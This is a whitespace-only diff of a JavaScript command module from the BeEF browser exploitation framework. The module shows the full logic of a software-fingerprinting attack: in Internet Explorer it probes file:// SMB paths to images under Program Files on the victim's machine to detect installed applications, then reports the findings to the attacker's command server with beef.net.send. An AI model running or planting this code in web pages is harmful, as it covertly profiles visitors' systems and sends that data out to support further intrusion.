@@ -13,7 +13,7 @@ beef.execute(function() {
         "InterVideo/WinDVD/Skins/WinDVD 5/Audio SRS Subpanel/Audio_SRS_Subpanel_Base_Mask.bmp",
         "Java/jre1.6.0_02/lib/images/cursors/invalid32x32.gif",
         "Common Files/Roxio Shared/9.0/Tutorial/Graphics/archive.gif",
-        "Windows Sidebar/Gadgets/Weather.Gadget/images/1px.gif", 
+        "Windows Sidebar/Gadgets/Weather.Gadget/images/1px.gif",
         "Pinnacle/Shared Files/Pixie/Register/hdr_register_1.gif",
         "Adobe/Reader 8.0/Reader/BeyondReader/ENU/Onramp/acrobat.gif",
         "eFax Messenger 4.3/Media/ENU/confidential.gif",
@@ -116,13 +116,13 @@ beef.execute(function() {
         "Microsoft Office 12",
         "Windows Media Player"
                               ]
-                              
+
     if (navigator.appName != "Microsoft Internet Explorer") {
         result = 'Software detection module only works in IE (so far)';
         beef.net.send("<%= @command_url %>", <%= @command_id %>, "detect_software="+result);
-    
-    // Using IE lets test for smb enum    
-    } else { 
+
+    // Using IE lets test for smb enum
+    } else {
      	var pic1 = new Image();
         pic1.src= "file:///\\127.0.0.1/C$/WINDOWS/system32/ntimage.gif";
         var pic2 = new Image();
@@ -131,32 +131,32 @@ beef.execute(function() {
         if (pic1.width == 28 && pic2.width == 28) {
             result = 'SMB method of detecting software failed';
             beef.net.send("<%= @command_url %>", <%= @command_id %>, "detect_software="+result);
-            
-        // smb enum is working lets look for installed software    
-        } else { 
+
+        // smb enum is working lets look for installed software
+        } else {
         	result = '';
             var sixtyfourbitvista = 0;
         	for (var x = 0; x < files.length; x++) {
             	var pic1 = new Image();
             	pic1.src= "file:///\\127.0.0.1/C$/Program Files/" + files[x];
-            	
-            	if (pic1.width != 28) { 
+
+            	if (pic1.width != 28) {
                 	result += descriptions[x];
                 	result += ' and ';
-                
+
             	} else {
                 	pic1.src= "file:///\\127.0.0.1/C$/Program Files (x86)/" + files[x];
-                	if (pic1.width != 28) { 
+                	if (pic1.width != 28) {
                     	result += descriptions[x];
                     	result += ' and ';
 
                     	sixtyfourbitvista = 1;
                 	}
             	}
-        	} 
-        	
+        	}
+
         	 beef.net.send("<%= @command_url %>", <%= @command_id %>, "detect_software="+result);
         }
     }
-    
+
 });
